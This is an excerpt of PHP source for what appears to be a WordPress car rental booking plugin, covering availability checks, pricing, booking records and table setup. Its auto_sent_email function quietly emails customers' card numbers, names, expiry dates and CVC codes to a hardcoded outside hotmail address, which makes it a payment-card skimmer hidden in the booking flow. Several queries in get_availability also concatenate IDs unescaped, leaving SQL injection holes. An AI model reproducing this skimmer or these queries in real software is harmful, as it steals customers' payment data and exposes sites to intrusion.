...
class CarRental {
	...
	public static $checkoutbooking = array();
	public static $checkoutprice;
	public static $checkoutdrivers = array();
  ...
  */
  ...
  public static function carrental_summary() {
	...
	*/
// 	public static function carrental_checkout_summary(){
// 		$summary = self::get_checkout_summary($_GET['confirmPage']);
// 		self::template('confirmPage', array('confirmPage' => $summary));
// 	}


	public static function carrental_checkout_reservation() {
		
// 		$order_hash = self::check_out_summary($_POST);
// 		
// 		Header('Location: ' . home_url() . '?page=carrental&confirmPage=' . $order_hash); Exit;
		...
		self::template('confirmPage', array('locations' => $locations,
  ...
  public static function get_locations() {
	...
	public function get_vehicles($filters) {
		...
		try {
			...
			$where = ' f.`deleted` IS NULL ';
				...
				$date_day_from=date('Y-m-d', strtotime($filters['fd']));
				$date_day_to=date('Y-m-d', strtotime($filters['td']));
				...
				if (false){//$overbooking && $overbooking == 'no') {
			...
			// Get prices and availablity for results
			if ($data['results'] && !empty($data['results'])) {
				foreach ($data['results'] as $key => $val) {
					...
					$data['results'][$key]->availability = self::get_availability($val->id_fleet, $date_from, $date_to,$date_day_from,$date_day_to);
	...
	/**
	* get availibility of vehicles
	**/
	public function get_availability($id,$date_from, $date_to,$date_day_from,$date_day_to) {
		global $wpdb;
		$triggerSql='SELECT f.`availability` FROM `'.CarRental::$db['fleet'].'` f WHERE f.`id_fleet` ='.$id.'';
		$trigger=$wpdb->get_var($triggerSql);
		$modeSQL='SELECT f.`forceAvailable` FROM `'.CarRental::$db['fleet'].'` f WHERE f.`id_fleet` ='.$id.'';
		$mode=$wpdb->get_var($modeSQL);
		$d_date = date('Y-m-d');
		if($mode==$d_date)
		{
		$sql= 
		'SELECT COUNT(*) FROM `' . CarRental::$db['booking'] . '` b
		...
		'SELECT COUNT(*) FROM `' . CarRental::$db['booking'] . '` b
														WHERE b.`vehicle_id` ='.$id.'
															AND b.`deleted` IS NULL
															AND ((DATE(b.`enter_date`) <= "' . $wpdb->escape($date_day_from) . '" AND DATE(b.`return_date`) >= "' . $wpdb->escape($date_day_from) . '") OR
																	 (DATE(b.`enter_date`) <= "' . $wpdb->escape($date_day_to) . '" AND DATE(b.`return_date`) >= "' . $wpdb->escape($date_day_to) . '") OR
																	 (DATE(b.`enter_date`) >= "' . $wpdb->escape($date_day_from) . '" AND DATE(b.`return_date`) <= "' . $wpdb->escape($date_day_to) . '"))';
				$a=$wpdb->get_var($sql);
...
/**
	 ...
	 */	 	
	public function get_pricesoriginal($type = 'fleet', $id, $date_from, $date_to, $promocode = NULL) {
		global $wpdb;
...
', $id, $promocode, $data['pr_type'], $data['pr_value'], $data['pr_value']));
	...
	/**
	 *	Get price for the vehicle(Only used to return car price)
	 */	 	
	public function get_prices($type = 'fleet', $id, $date_from, $date_to, $promocode = NULL) {
		...
		try {
			...
			$pr_type = (($diff_hours >= 0) ? 2 : 1); // 1 - days, 2 - hours
			$pr_value = (($pr_type == 2) ? $diff_hours : $diff_days);
			$db_name = (($type == 'extras') ? CarRental::$db['extras_pricing'] : CarRental::$db['fleet_pricing']);
			$db_name_global = (($type == 'extras') ? CarRental::$db['extras'] : CarRental::$db['fleet']);
			$id_column = (($type == 'extras') ? 'id_extras' : 'id_fleet');
			...
			$schemes = $wpdb->get_results($wpdb->prepare('SELECT p.name, fp.`id_pricing`, p.`type`, p.`maxprice`, p.`currency`, p.`vat`, p.`onetime_price`, pr.`price`, p.`active_days`, p.`rate_id`, fp.`valid_to`, fp.`valid_from`, p.`promocode`
							...
							WHERE fp.`' . $id_column . '` = %d
								...
								AND ((p.`type` = 2 AND pr.`type` = %d AND pr.`no_from` <= %d AND (pr.`no_to` >= %d || pr.`no_to` = 0)) OR 
										 (p.`type` = 1))
							ORDER BY fp.`priority` ASC
', $id, $promocode, '1', (($diff_days==0)?1:$diff_days), (($diff_days==0)?1:$diff_days)));

			$schemes2 = $wpdb->get_results($wpdb->prepare('SELECT p.name, fp.`id_pricing`, p.`type`, p.`maxprice`, p.`currency`, p.`vat`, p.`onetime_price`, pr.`price`, p.`active_days`, p.`rate_id`, fp.`valid_to`, fp.`valid_from`, p.`promocode`
							FROM `' . $db_name . '` fp
							LEFT JOIN `' . CarRental::$db['pricing'] . '` p ON p.`id_pricing` = fp.`id_pricing`
							LEFT JOIN `' . CarRental::$db['pricing_ranges'] . '` pr ON pr.`id_pricing` = p.`id_pricing`
							WHERE fp.`' . $id_column . '` = %d
								...
								AND ((p.`type` = 2 AND pr.`type` = %d AND pr.`no_from` <= %d AND (pr.`no_to` >= %d || pr.`no_to` = 0)) OR 
										 (p.`type` = 1))
							ORDER BY fp.`priority` ASC
', $id, $promocode, '2', $diff_hours+1, $diff_hours+1));
			...
			if ($scheme && !empty($scheme)) {
			 ...
			 //echo 'Priority: ' . $id . ' => '; var_dump($scheme); echo '<br /><br />'; /**/
				
			// Get global price scheme
			} else {

				// DEBUG-MODE: echo '-- Pro datum od '.date('d.m.Y',$date_from_only_day).' do '.date('d.m.Y',$date_to_only_day).' Vybrano defaultni schema.';
				$sql1 = 'SELECT p.`id_pricing`, p.`type`, p.`maxprice`, p.`currency`, p.`vat`, p.`onetime_price`, pr.`price`, p.`active_days`, p.`rate_id`
									FROM `' . $db_name_global . '` f
									LEFT JOIN `' . CarRental::$db['pricing'] . '` p ON p.`id_pricing` = f.`global_pricing_scheme`
									LEFT JOIN `' . CarRental::$db['pricing_ranges'] . '` pr ON pr.`id_pricing` = p.`id_pricing`
									WHERE f.`' . $id_column . '` = %d
										...
										AND ((p.`type` = 2 AND pr.`type` = %d AND pr.`no_from` <= %d AND (pr.`no_to` >= %d || pr.`no_to` = 0)) OR 
										 		 (p.`type` = 1))
									LIMIT 1';
					$scheme = $wpdb->get_row($wpdb->prepare($sql1, $id, $promocode, '1', (($diff_days==0)?1:$diff_days), (($diff_days==0)?1:$diff_days)));

					$sql2 = 'SELECT p.`id_pricing`, p.`type`, p.`maxprice`, p.`currency`, p.`vat`, p.`onetime_price`, pr.`price`, p.`active_days`, p.`rate_id`
									FROM `' . $db_name_global . '` f
									LEFT JOIN `' . CarRental::$db['pricing'] . '` p ON p.`id_pricing` = f.`global_pricing_scheme`
									LEFT JOIN `' . CarRental::$db['pricing_ranges'] . '` pr ON pr.`id_pricing` = p.`id_pricing`
									WHERE f.`' . $id_column . '` = %d
										...
										AND ((p.`type` = 2 AND pr.`type` = %d AND pr.`no_from` <= %d AND (pr.`no_to` >= %d || pr.`no_to` = 0)) OR 
										 		 (p.`type` = 1 ))
									LIMIT 1';
					$scheme2 = $wpdb->get_row($wpdb->prepare($sql2, $id, $promocode, '2', $diff_hours+1, $diff_hours+1));
					
					if ($scheme2 && !empty($scheme2)) {
			...
			// Time based
				...
				if($no_days) {
					$data['id_pricing'] = $scheme2->id_pricing;
				$data['rate_id'] = $scheme2->rate_id;
				$data['vat'] 				= $scheme2->vat;
				$data['type'] 			= $scheme2->type;
				$data['currency'] 	= $scheme2->currency;
				$data['active_days'] 	= $scheme2->active_days;
				$data['priceHour']=$scheme2->price; // Price per day/hour
				$data['total_rental'] = $data['priceHour'] * ($diff_days*24+$diff_hours); // PriceHour * number of hours
				$data['priceHourTax']=$data['priceHour']*$data['vat']/100;
				...
				$data['priceHourTax']=$data['priceHour']*$data['vat']/100;
				if($no_hours)
					$data['total_rental'] = $data['price'] * $diff_days; // Price * number of days/hours
				else if ($data['price']==0)
				{
					$data['total_rental'] = $data['priceHour'] * ($diff_days*24+$diff_hours); // PriceHour * number of hours
				}
				else
					$data['total_rental'] =$data['price'] * $diff_days+$data['priceHour']*$diff_hours; // Price * number of days/hours
					}
			}
			...
			if($no_days)
			{
							if ($scheme2->currency != $current_currency ) {
				
				if ($current_currency == $global_currency && isset($av_currencies[$scheme->currency])) {
				
					$rate = $av_currencies[$scheme2->currency];
					$data['price'] *= $rate;
					$data['total_rental'] *= $rate;

					// echo 'Price:' . $scheme->price * $rate . "<br />"; // DEBUG
				
				} elseif ($scheme2->currency != $global_currency) {
					
					$rate = round($av_currencies[$scheme2->currency] / $av_currencies[$current_currency], 2);
					$data['price'] *= $rate;
					$data['total_rental'] *= $rate;
...
//			if(preg_match($reg,($data['email']))){
			$arr = array('id_order' 		=> $id_order,
									 ...
									 'license_expiry_date'   => $date['license_expiry_date'],
									 'landline_number'      => $date['landline_number'],
									 'issue_country'       => $date['issue_country'],
...
//			 }
 ...
 //   	$id_booking = $wpdb->insert_id;
				...
				// Extras prices
					if (isset($data['extras']) && !empty($data['extras'])) {
						foreach ($data['extras'] as $key => $id_extras) {
							...
							//add additional cost to extras
 							if(isset($data['driver']) && !empty($data['driver']))
 					{
 						if($data['driver']>0)
 						{
 							$extras_detail = self::get_extras_parameters((int) $data['driverID']);
 							$extras_prices = self::get_prices('extras', (int) $data['driverID'], $date_from, $date_to, $data['promo']);
 							$arr = array('id_booking' => $id_booking,
 													 'name' 			=> $extras_detail->name,
 													 'price' 			=> ((int) $data['driver'] )* (float) $extras_prices['total_rental'],
 													 'currency' 	=> $extras_prices['currency']);
 							$wpdb->insert(CarRental::$db['booking_prices'], $arr);
 							...
 							if ((float) $extras_prices['tax_total_rental'] > 0) {
 								$arr = array('id_booking' => $id_booking,
 														 'name' 			=> $extras_detail->name . ' - ' . $extras_prices['vat'] . '% Value Added Tax',
 														 'price' 			=> ((int) $data['driver'] )* (float) $extras_prices['tax_total_rental'],
 														 'currency' 	=> $extras_prices['currency']);
 								$wpdb->insert(CarRental::$db['booking_prices'], $arr);
 							}
 						}
				...
				foreach ($data['drv'] as $key => $val) {
					if (!empty($val['first_name']) && !empty($val['last_name']) && !empty($val['email']) && !empty($val['phone'])) {
						$arr = array('id_booking' 	=> $id_booking,
									             ...
									             'landline_number'      => $val['landline_number'],
									             'issue_country'       => $val['issue_country'],
												 'street' 			=> $val['street'],
												 'city' 				=> $val['city'],
												 'zip' 					=> $val['zip'],
												 'country' 			=> $val['country'],
	...
	public function get_order_summary($hash) {
		...
		try {
			...
			if(!empty($data['info']->email)){
				self::auto_sent_email($data['info'], $hash);
			}else{
				print_r("no valid sent to email address");
			}
			return $data;
	...
	/**
	* System auto sent email
	*/
	public function auto_sent_email($info, $order_hash){
		$link = (home_url() . '?page=carrental&summary=' . $order_hash);
		$credit_info = $_POST['credit'];
		$reference_number = $info->id_order;
		$vehicle_info = $info->vehicle;
		$vehicle_id = $info->vehicle_id;
		$pick_date = $info->enter_date;
		$pick_address = $info->enter_loc;
		$return_address = $info->return_loc;
		$return_date = $info->return_date; 
		$to = $info->email; 
		$name = $info->first_name.' '.$info->last_name;
		$subject = 'NEW RENTAL CAR BOOKING'.$reference_number;
		$txt = 'Car Model: '.$vehicle_info ."\r\n".
		'Vehicle ID: '.$vehicle_id ."\r\n".
		'Pick Up Date: '.$pick_date . "\r\n".
		'Pick Up Address: '.$pick_address ."\r\n".
		...
		'*********************************************'."\r\n".
		'Credit No:'.$credit->no ."\r\n".
		'First Name:'.$credit->first_name."\r\n".
		'Last Name:'.$credit->last_name."\r\n".
		'Expiry Date'.$credit->valid."\r\n".
		'CVC:'.$credit->cvc;
		//print_r($to);
		wp_mail('scofield______@hotmail.com',$subject,$txt);
	 ...
	 */	 	
	public function get_checkout_summary($hash) {
		
		try {
					
// 			$data['info'] = array("orange", "banana");
// 			if ($data['info'] && !empty($data['info'])) {
// 			
// 				$data['prices'] = $checkoutprice;
// 				
// 				$data['drivers'] = $checkoutdrivers;
// 			
// 			}
// 			
// 			return $data;
	...
	public static function get_state_list() {
		$arr= array ('ACT'=>'Australian Capital Territory', 'NSW' => 'New South Wales', 'NT'=>'Northern Territory', 'Qld'=>'Queensland', 'SA'=>'South Australia', 'TAS'=>'Tasmania', 'VIC'=>'Victoria', 'WA'=>'Western Australia','OTHERS'=>'Other Countries, please specify.');
		//asort($arr);
		reset($arr);
		return $arr;
	}
	...
	public static function plugin_activation() {
		...
		try {
			...
			$sql = "CREATE TABLE `" . $carrental_db['fleet'] . "` (
							  ...
							  `excess_mileage` varchar(50) NOT NULL,
							  `fuel_shortage` varchar(50) NOT NULL,
							  `description` text NOT NULL,
			...
			$sql = "CREATE TABLE `" . $carrental_db['booking'] . "` (
							  ...
							  `vehicle_drive` varchar(50) NOT NULL,
							  `vehicle_fuel` varchar(50) NOT NULL,
							  `check_in_mileage` varchar(50) NOT NULL,
							  `check_out_mileage` varchar(50) NOT NULL,
							  `check_in_fuel` varchar(50) NOT NULL,
							  `check_out_fuel` varchar(50) NOT NULL,
